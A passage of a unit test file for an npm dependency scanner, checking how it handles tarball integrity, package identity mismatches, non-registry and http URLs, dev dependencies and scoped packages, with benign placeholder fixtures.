        { name: 'left-pad', version: '1.2.3', resolved: registryUrl('left-pad', '1.2.3') },
        { name: 'inner', version: '1.0.0', nested: true, resolved: registryUrl('inner', '1.0.0') },
      ]);
      expect(ids(findings)).toEqual(['DEPS-TARBALL-SKIP-001']);
      expect(findings[0]?.severity).toBe('info');
      expect(findings.some((finding) => finding.snippet?.includes('inner'))).toBe(false);
      expect(net.count()).toBe(0);
    } finally {
      net.restore();
    }
  });

  it('does not emit a skip row when every direct production dependency has integrity', async () => {
    enable('NPM_TARBALL_GATE');
    const cache = await tempDir();
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER, resolved: registryUrl('left-pad', '1.2.3') },
      { name: 'inner', version: '1.0.0', nested: true, resolved: registryUrl('inner', '1.0.0') },
    ]);
    expect(findings).toEqual([]);
  });

  it('does not skip a direct dependency that has no registry tarball URL', async () => {
    enable('NPM_TARBALL_GATE');
    const cache = await tempDir();
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3' }]);
    expect(findings).toEqual([]);
  });

  it('ignores a non-registry tarball URL', async () => {
    enable(...FLAGS.filter((flag) => flag !== 'NPM_REG_INTEGRITY'));
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9', {}, {
      'package/.git/hooks/pre-commit': '#!/bin/sh\n',
    }));
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      integrity: PLACEHOLDER,
      resolved: 'https://example.invalid/left-pad-1.2.3.tgz',
    }]);
    expect(findings).toEqual([]);
  });

  it('ignores an http registry URL', async () => {
    enable('NPM_TARBALL_ID', 'NPM_TARBALL_GATE');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9'));
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      resolved: 'http://registry.npmjs.org/left-pad/-/left-pad-1.2.3.tgz',
    }]);
    expect(findings).toEqual([]);
  });

  it('ignores dev dependencies', async () => {
    enable('NPM_TARBALL_ID', 'NPM_TARBALL_HOOK');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9', {}, {
      'package/.github/workflows/ci.yml': 'name: ci\n',
    }));
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      integrity: PLACEHOLDER,
      dev: true,
    }]);
    expect(findings).toEqual([]);
  });

  it('does not open a tarball when lock and packument integrity differ under the registry flag', async () => {
    enable('NPM_REG_INTEGRITY', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    const bytes = Buffer.from('locked-bytes');
    const integrity = digest(bytes);
    await writePackument(cache, 'left-pad', '1.2.3', {
      dist: { integrity: digest(Buffer.from('registry-bytes')), tarball: registryUrl('left-pad', '1.2.3') },
    });
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9'), bytes);
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      integrity,
      resolved: registryUrl('left-pad', '1.2.3'),
    }]);
    expect(findings).toEqual([]);
  });

  it('checks a scoped package descriptor', async () => {
    enable('NPM_TARBALL_ID');
    const cache = await tempDir();
    await writeDescriptor(cache, '@acme/widget', pkgEntries('@acme/widget', '1.2.3'));
    await writeDescriptor(cache, '@acme/other', pkgEntries('widget', '1.2.3'));
    const findings = await scan(cache, [
      { name: '@acme/widget', version: '1.2.3', integrity: PLACEHOLDER },
      { name: '@acme/other', version: '1.2.3', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-ID-001']);
  });

  it('emits none of these ids on clean-app with every lane D flag and no tarball cache', async () => {
    enable(...FLAGS.filter((flag) => flag !== 'NPM_REG_INTEGRITY'));
    const cache = await tempDir();
    const cwd = join(process.cwd(), 'test', 'fixtures', 'clean-app');
    const manifest = await readFile(join(cwd, 'package.json'), 'utf8');
    const lock = await readFile(join(cwd, 'package-lock.json'), 'utf8');
    const own = new Set(laneRows.map((row) => row.ruleId));
    const findings = await laneFindings({
      cwd,
      files: ['package.json', 'package-lock.json'],
      manifestRaw: manifest,
      lockTexts: { 'package-lock.json': lock },
      cacheDir: cache,
      offline: true,
    });
    expect(findings.filter((finding) => own.has(finding.ruleId))).toEqual([]);
  });
});
